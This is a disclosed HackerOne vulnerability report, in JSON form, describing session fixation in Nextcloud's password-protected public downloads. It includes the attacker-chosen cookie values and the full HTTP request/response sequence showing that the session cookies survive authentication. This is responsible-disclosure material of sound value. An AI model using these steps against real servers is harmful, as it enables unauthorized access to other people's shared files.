{
  "id": 237184,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzcxODQ=",
  "url": "https://hackerone.com/reports/237184",
  "title": "Session fixation in password protected public download.",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2017-06-06T09:17:29.211Z",
  "submitted_at": "2017-06-06T09:17:29.211Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "frankspierings",
    "url": "/frankspierings",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 13291,
    "url": "https://hackerone.com/nextcloud",
    "handle": "nextcloud",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Nextcloud",
      "twitter_handle": "nextclouders",
      "website": "https://nextcloud.com",
      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2018-16463"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-10-25T10:26:31.557Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2018-09-25T10:26:18.925Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Public downloads protected with a password are vulnerable to a session fixation attack. This finding was discovered during a penetration test of NextCloud version 10.0.2.7.\n\n1) Pre-provision a victim with the attacker controlled cookie values:\n\nFirefox cookie manager:\n```\nwww.clouddrive.example\tFALSE\t%2F\tFALSE\t0\tocu1w9tvnra8\tAAAAAAAAAAAAAAAAAAAAAAAAA1\nwww.clouddrive.example\tFALSE\t%2F\tTRUE\t0\toc_sessionPassphrase\tAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1\nwww.clouddrive.example\tFALSE\t%2F\tTRUE\t4133980799\t__Host-nc_sameSiteCookielax\tTRUE\nwww.clouddrive.example\tFALSE\t%2F\tTRUE\t4133980799\t__Host-nc_sameSiteCookiestrict\tTRUE \n```\n\n2) The victim receives a public download link for a file. This resource is password protected by NextCloud. \nDownloading the file consists of several requests. Notice that all requests are being performed with the pre-provisioned cookies. These cookies are never replaced after successful authentication.\n\nRequest:\n```\nGET /index.php/s/Ezn3dOeZ28Hph57 HTTP/1.1\nHost: www.clouddrive.example\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nCookie: __Host-nc_sameSiteCookielax=TRUE; __Host-nc_sameSiteCookiestrict=TRUE; ocu1w9tvnra8=AAAAAAAAAAAAAAAAAAAAAAAAA1; oc_sessionPassphrase=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1\nConnection: close\nUpgrade-Insecure-Requests: 1\n```\n\nResponse:\n```\nHTTP/1.1 302 Found\nDate: Tue, 06 Jun 2017 08:26:52 GMT\nServer: Apache\nX-Powered-By: PHP/7.0.17\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate\nPragma: no-cache\nContent-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval' 'nonce-a3N2dzQremRnTmJLdytUaWJoZkEvenVZUHYwRjhDZVFUT2dacUNyb0s0ND06MnIrS3pMU3Y2T0MvcXFpb0ZGNlB5bFgvRDdSZnNtN25QN3hmNzFpcVc4TT0='; style-src 'self' 'unsafe-inline'; frame-src *; img-src * data: blob:; font-src 'self' data:; media-src *; connect-src *\nSet-Cookie: __Host-nc_sameSiteCookielax=true; path=/; httponly;secure; expires=Fri, 31-Dec-2100 23:59:59 GMT; SameSite=lax\nSet-Cookie: __Host-nc_sameSiteCookiestrict=true; path=/; httponly;secure; expires=Fri, 31-Dec-2100 23:59:59 GMT; SameSite=strict\nLocation: /index.php/s/Ezn3dOeZ28Hph57\nX-Content-Type-Options: nosniff\nX-XSS-Protection: 1; mode=block\nX-Robots-Tag: none\nX-Frame-Options: SAMEORIGIN\nX-Download-Options: noopen\nX-Permitted-Cross-Domain-Policies: none\nConnection: close\nContent-Type: text/html; charset=UTF-8\nStrict-Transport-Security: max-age=16000000; includeSubDomains; preload;\nContent-Length: 0\n```\n\nRequest:\n```\nGET /index.php/s/Ezn3dOeZ28Hph57 HTTP/1.1\nHost: www.clouddrive.example\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nCookie: __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; ocu1w9tvnra8=AAAAAAAAAAAAAAAAAAAAAAAAA1; oc_sessionPassphrase=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1\nConnection: close\nUpgrade-Insecure-Requests: 1\n```\n\nResponse:\n```\nHTTP/1.1 303 See Other\nDate: Tue, 06 Jun 2017 08:26:54 GMT\nServer: Apache\nX-Powered-By: PHP/7.0.17\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nPragma: no-cache\nCache-Control: no-cache, must-revalidate\nContent-Security-Policy: default-src 'none';script-src 'nonce-S1pwTXU1dEdaSEVkSFZPeENMR01jbVBxcGZLSmJTaC9CS0lpNHZtOGNnWT06WWU0MmxNTTBERWRvZEIvN2N2akRSdzJObEx2VEwyRUlkL1prcFl2K0Frcz0=' 'unsafe-eval';style-src 'self' 'unsafe-inline';img-src 'self' data: blob:;font-src 'self';connect-src 'self';media-src 'self'\nLocation: /index.php/s/Ezn3dOeZ28Hph57/authenticate\nX-Content-Type-Options: nosniff\nX-XSS-Protection: 1; mode=block\nX-Robots-Tag: none\nX-Frame-Options: SAMEORIGIN\nX-Download-Options: noopen\nX-Permitted-Cross-Domain-Policies: none\nConnection: close\nContent-Type: text/html; charset=UTF-8\nStrict-Transport-Security: max-age=16000000; includeSubDomains; preload;\nContent-Length: 0\n```\n\nRequest:\n```\nGET /index.php/s/Ezn3dOeZ28Hph57/authenticate HTTP/1.1\nHost: www.clouddrive.example\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nCookie: __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; ocu1w9tvnra8=AAAAAAAAAAAAAAAAAAAAAAAAA1; oc_sessionPassphrase=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1\nConnection: close\nUpgrade-Insecure-Requests: 1\n```\n\nResponse:\n```\nHTTP/1.1 200 OK\nDate: Tue, 06 Jun 2017 08:26:56 GMT\nServer: Apache\nX-Powered-By: PHP/7.0.17\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nPragma: no-cache\nCache-Control: no-cache, must-revalidate\nContent-Security-Policy: default-src 'none';script-src 'nonce-NnBNTW9hUjVmeWJUNzJkdm1YaDFJQUhzV2hnL2VqVEgrdHlDSmJ5Rzc0dz06b3VkMmp2d0xGeENtaGlzbDR6RTZGVytMYTFGbE9IMndpWWpFWXM3RW44RT0=' 'unsafe-eval';style-src 'self' 'unsafe-inline';img-src 'self' data: blob:;font-src 'self';connect-src 'self';media-src 'self'\nContent-Length: 17294\nX-Content-Type-Options: nosniff\nX-XSS-Protection: 1; mode=block\nX-Robots-Tag: none\nX-Frame-Options: SAMEORIGIN\nX-Download-Options: noopen\nX-Permitted-Cross-Domain-Policies: none\nConnection: close\nContent-Type: text/html; charset=UTF-8\nStrict-Transport-Security: max-age=16000000; includeSubDomains; preload;\n```\n\nNow the authentication takes place:\n\nRequest:\n```\nPOST /index.php/s/Ezn3dOeZ28Hph57/authenticate HTTP/1.1\nHost: www.clouddrive.example\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 144\nCookie: __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; ocu1w9tvnra8=AAAAAAAAAAAAAAAAAAAAAAAAA1; oc_sessionPassphrase=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1\nConnection: close\nUpgrade-Insecure-Requests: 1\n\nrequesttoken=6pMMoaR5fybT72dvmXh1IAHsWhg%2FejTH%2BtyCJbyG74w%3D%3Aoud2jvwLFxCmhisl4zE6FW%2BLa1FlOH2wiYjEYs7En8E%3D&password=SessionFixation01%21\n```\n\nResponse:\n```\nHTTP/1.1 303 See Other\nDate: Tue, 06 Jun 2017 08:27:10 GMT\nServer: Apache\nX-Powered-By: PHP/7.0.17\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nPragma: no-cache\nCache-Control: no-cache, must-revalidate\nContent-Security-Policy: default-src 'none';script-src 'nonce-M3hVNVRMdTJkYWZGNTFoQVN4VHcrRTZ6b2dHUkg0SnQrM0w4Z01VNU1MST06bDJGRFkrUEVIWkd3amhRS01WMi96U0RVazBqTFhjc2FpQ2E2eDdkN1FQOD0=' 'unsafe-eval';style-src 'self' 'unsafe-inline';img-src 'self' data: blob:;font-src 'self';connect-src 'self';media-src 'self'\nLocation: /index.php/s/Ezn3dOeZ28Hph57\nX-Content-Type-Options: nosniff\nX-XSS-Protection: 1; mode=block\nX-Robots-Tag: none\nX-Frame-Options: SAMEORIGIN\nX-Download-Options: noopen\nX-Permitted-Cross-Domain-Policies: none\nConnection: close\nContent-Type: text/html; charset=UTF-8\nStrict-Transport-Security: max-age=16000000; includeSubDomains; preload;\nContent-Length: 0\n```\n\nRequest:\n```\nGET /index.php/s/Ezn3dOeZ28Hph57 HTTP/1.1\nHost: www.clouddrive.example\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nCookie: __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; ocu1w9tvnra8=AAAAAAAAAAAAAAAAAAAAAAAAA1; oc_sessionPassphrase=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1\nConnection: close\nUpgrade-Insecure-Requests: 1\n```\n\nResponse Headers:\n```\nHTTP/1.1 200 OK\nDate: Tue, 06 Jun 2017 08:27:12 GMT\nServer: Apache\nX-Powered-By: PHP/7.0.17\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nPragma: no-cache\nCache-Control: no-cache, must-revalidate\nContent-Security-Policy: default-src 'none';script-src 'nonce-aGcyeFVwaml6OGprZWpNbWdBUFVvMkMyM0p0WVpWUXdTNkpPKzlkZHZPND06em5uTGZjQ1FwLzZSRTM5cytrcWJsZzdSN2RJQ0p4MUhPUFlJdktVZnpLTT0=' 'unsafe-eval';style-src 'self' 'unsafe-inline';img-src 'self' data: blob:;font-src 'self';connect-src 'self';media-src 'self';frame-src 'self'\nContent-Length: 20599\nX-Content-Type-Options: nosniff\nX-XSS-Protection: 1; mode=block\nX-Robots-Tag: none\nX-Frame-Options: SAMEORIGIN\nX-Download-Options: noopen\nX-Permitted-Cross-Domain-Policies: none\nConnection: close\nContent-Type: text/html; charset=UTF-8\nStrict-Transport-Security: max-age=16000000; includeSubDomains; preload;\n```\n\nClicking the direct download button will generate the following:\n\nRequest:\n```\nGET /index.php/s/Ezn3dOeZ28Hph57/download HTTP/1.1\nHost: www.clouddrive.example\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nCookie: __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; ocu1w9tvnra8=AAAAAAAAAAAAAAAAAAAAAAAAA1; oc_sessionPassphrase=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1\nConnection: close\nUpgrade-Insecure-Requests: 1\n```\n\nResponse:\n```\nHTTP/1.1 200 OK\nDate: Tue, 06 Jun 2017 08:29:11 GMT\nServer: Apache\nX-Powered-By: PHP/7.0.17\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate\nPragma: no-cache\nContent-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval' 'nonce-emRneTV0RDFQQXRibTlqY0phbUJsTm5QcTJSSGZ1RFVQWFgxZTROUFpyUT06aGF4SXlZaUhWRDB1OHBTV1grRE9vYmVvbWkwZFBLbWpUaUd6UFBFTkZ2az0='; style-src 'self' 'unsafe-inline'; frame-src *; img-src * data: blob:; font-src 'self' data:; media-src *; connect-src *\nContent-Disposition: attachment; filename*=UTF-8''Public%20Download%20-%20Session%20Fixation%20Example.txt; filename=\"Public%20Download%20-%20Session%20Fixation%20Example.txt\"\nOC-ETag: \"5936650b3d865\"\nLast-Modified: Tue, 06 Jun 2017 08:17:15 GMT\nETag: \"5936650b3d865\"\nContent-Length: 54\nX-Content-Type-Options: nosniff\nX-XSS-Protection: 1; mode=block\nX-Robots-Tag: none\nX-Frame-Options: SAMEORIGIN\nX-Download-Options: noopen\nX-Permitted-Cross-Domain-Policies: none\nContent-Type: text/plain;charset=UTF-8\nStrict-Transport-Security: max-age=16000000; includeSubDomains; preload;\n\nThis file could be acquired through session fixation.\n```\n\n3) The attacker needs the following to acquire the file:\n- Pre-provision the cookies in the victim's browser.\n- Know the token to the public file.",
  "weakness": {
    "id": 47,
    "name": "Session Fixation"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2018-10-25T10:26:19.071Z",
  "allow_singular_disclosure_after": -167365046.12839556,
  "singular_disclosure_allowed": true,
  "vote_count": 19,
  "voters": [
    "pinkmeimei",
    "sameerphad72",
    "ali",
    "shubham_srt",
    "savitar0x01",
    "eveeez",
    "khizer47",
    "pandaonair",
    "japz",
    "silv3rpoision",
    "and 9 more..."
  ],
  "severity": {
    "rating": "low",
    "score": 3.1,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
